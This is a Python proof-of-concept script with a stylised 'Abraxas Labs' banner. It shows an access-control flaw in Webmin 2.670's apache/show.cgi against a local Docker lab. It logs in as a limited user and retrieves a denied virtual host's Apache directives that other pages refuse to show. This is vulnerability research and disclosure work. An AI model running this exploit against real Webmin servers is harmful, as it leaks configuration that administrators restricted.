#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-apache-show-idor (Medium: 6.5)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: apache/show.cgi prints denied vhost directives
#  Requires: Docker, git, python3
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-apache-show-idor"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Webmin 2.670: apache/show.cgi prints a denied VirtualHost's directives."""

import http.client
import subprocess
import urllib.parse
from dataclasses import dataclass
from pathlib import Path
from typing import Mapping

LABEL = "WEBMIN-H01-APACHE-SHOW"
WITNESS = "WEBMIN-H01-APACHE-IDOR"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18490
BASE = f"http://{HOST}:{PORT}"
PROJECT = "webminh01"
SERVICE = "webmin"
LIMITED_USER = "limited"
LIMITED_PASS = "limited-pass"
ALLOWED_VIRT = "allowed.example:80"
DENIED_VIRT = "denied.example:80"
DENIED_TEXT = "You cannot edit this virtual server"
HERE = Path(__file__).resolve().parent


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]


def _cookie_header(cookies: Mapping[str, str]) -> str:
    return "; ".join(f"{name}={value}" for name, value in cookies.items())


def _parse_set_cookie(raw_headers: list[tuple[str, str]]) -> dict[str, str]:
    found: dict[str, str] = {}
    for key, value in raw_headers:
        if key.lower() != "set-cookie":
            continue
        first = value.split(";", 1)[0]
        if "=" not in first:
            continue
        name, cookie = first.split("=", 1)
        name = name.strip()
        if name:
            found[name] = cookie.strip()
    return found


def request(
    method: str,
    path: str,
    *,
    cookies: Mapping[str, str] | None = None,
    data: bytes | None = None,
    content_type: str | None = None,
    timeout: int = 30,
) -> HttpResult:
    headers = {
        "Host": f"{HOST}:{PORT}",
        "User-Agent": "lab-h01-apache",
        "Accept": "text/html,application/xhtml+xml",
        "Referer": f"{BASE}/apache/",
        "Connection": "close",
    }
    jar = dict(cookies or {})
    if jar:
        headers["Cookie"] = _cookie_header(jar)
    if data is not None:
        headers["Content-Type"] = content_type or "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(data))
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
        try:
            conn.request(method, path, body=data, headers=headers)
            resp = conn.getresponse()
            raw = resp.read()
            raw_headers = resp.getheaders()
            hdrs = {key.lower(): value for key, value in raw_headers}
            merged = dict(jar)
            merged.update(_parse_set_cookie(raw_headers))
            return HttpResult(
                resp.status,
                raw.decode("utf-8", errors="replace"),
                hdrs,
                merged,
            )
        finally:
            conn.close()
    except OSError as exc:
        raise ApiError("unreachable") from exc


def login(username: str, password: str) -> dict[str, str]:
    probe = request("GET", "/session_login.cgi", cookies={"testing": "1"})
    jar = dict(probe.cookies)
    jar["testing"] = "1"
    body = urllib.parse.urlencode(
        {"user": username, "pass": password, "page": "/"}
    ).encode("utf-8")
    result = request("POST", "/session_login.cgi", cookies=jar, data=body)
    jar.update(result.cookies)
    sid = jar.get("sid", "")
    if result.status not in (302, 200) or not sid or sid == "x":
        raise ApiError(f"login-{username}-{result.status}")
    if "session_failed" in result.body or "Invalid login" in result.body:
        raise ApiError(f"login-rejected-{username}")
    return {"testing": "1", "sid": sid}


def cgi_get(path: str, virt: str, cookies: Mapping[str, str]) -> HttpResult:
    query = urllib.parse.urlencode({"virt": virt})
    return request("GET", f"{path}?{query}", cookies=cookies)


def compose_exec(args: list[str]) -> str:
    proc = subprocess.run(
        ["docker", "compose", "-p", PROJECT, "exec", "-T", SERVICE, *args],
        check=False,
        capture_output=True,
        text=True,
        cwd=HERE,
    )
    return (proc.stdout or "").strip()


def image_version() -> str:
    proc = subprocess.run(
        [
            "docker",
            "image",
            "inspect",
            IMAGE,
            "--format",
            '{{ or (index .Config.Labels "version") (index .Config.Labels "webmin.version") }}',
        ],
        check=False,
        capture_output=True,
        text=True,
    )
    return (proc.stdout or "").strip()


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        label_version = image_version()
        note(f"IOC image={IMAGE} label-version={label_version or 'missing'}")
        version = compose_exec(["cat", "/etc/webmin/version"])
        note(f"IOC webmin-version={version or 'missing'}")
        if version != PIN:
            return finish(lines, f"FAIL {LABEL} server-version {WITNESS}")

        plant = compose_exec(["cat", "/etc/apache2/webmin-h01-vhosts.conf"])
        acl = compose_exec(["cat", "/etc/webmin/apache/limited.acl"])
        note(
            f"IOC plant witness={int(WITNESS in plant)} "
            f"allowed-only={int('allowed-only@' in plant)} "
            f"acl-virts={int('virts=allowed.example:80' in acl)}"
        )
        if WITNESS not in plant or "allowed-only@" not in plant:
            return finish(lines, f"FAIL {LABEL} plant-missing {WITNESS}")
        if "virts=allowed.example:80" not in acl:
            return finish(lines, f"FAIL {LABEL} limited-acl {WITNESS}")

        cookies = login(LIMITED_USER, LIMITED_PASS)
        note(f"IOC login={LIMITED_USER} sid={int(bool(cookies.get('sid')))}")

        allowed = cgi_get("/apache/show.cgi", ALLOWED_VIRT, cookies)
        note(
            f"IOC allowed-show status={allowed.status} "
            f"witness={int(WITNESS in allowed.body)} "
            f"own={int('allowed-only@' in allowed.body)}"
        )
        if allowed.status != 200 or "allowed-only@" not in allowed.body:
            return finish(lines, f"FAIL {LABEL} allowed-show-{allowed.status} {WITNESS}")
        if WITNESS in allowed.body:
            return finish(lines, f"FAIL {LABEL} allowed-has-witness {WITNESS}")

        virt_index = cgi_get("/apache/virt_index.cgi", DENIED_VIRT, cookies)
        note(
            f"IOC denied-virt-index status={virt_index.status} "
            f"denied={int(DENIED_TEXT in virt_index.body)} "
            f"witness={int(WITNESS in virt_index.body)}"
        )
        if DENIED_TEXT not in virt_index.body or WITNESS in virt_index.body:
            return finish(lines, f"FAIL {LABEL} virt-index-not-denied {WITNESS}")

        save_virt = cgi_get("/apache/save_virt.cgi", DENIED_VIRT, cookies)
        note(
            f"IOC denied-save-virt status={save_virt.status} "
            f"denied={int(DENIED_TEXT in save_virt.body)} "
            f"witness={int(WITNESS in save_virt.body)}"
        )
        if DENIED_TEXT not in save_virt.body or WITNESS in save_virt.body:
            return finish(lines, f"FAIL {LABEL} save-virt-not-denied {WITNESS}")

        leaked = cgi_get("/apache/show.cgi", DENIED_VIRT, cookies)
        note(
            f"IOC denied-show status={leaked.status} "
            f"witness={int(WITNESS in leaked.body)} "
            f"denied-text={int(DENIED_TEXT in leaked.body)}"
        )
        if leaked.status != 200:
            return finish(lines, f"FAIL {LABEL} show-status-{leaked.status} {WITNESS}")
        if DENIED_TEXT in leaked.body:
            return finish(lines, f"FAIL {LABEL} show-acl-closed {WITNESS}")
        if WITNESS not in leaked.body:
            return finish(lines, f"FAIL {LABEL} show-missing-witness {WITNESS}")
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except ApiError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

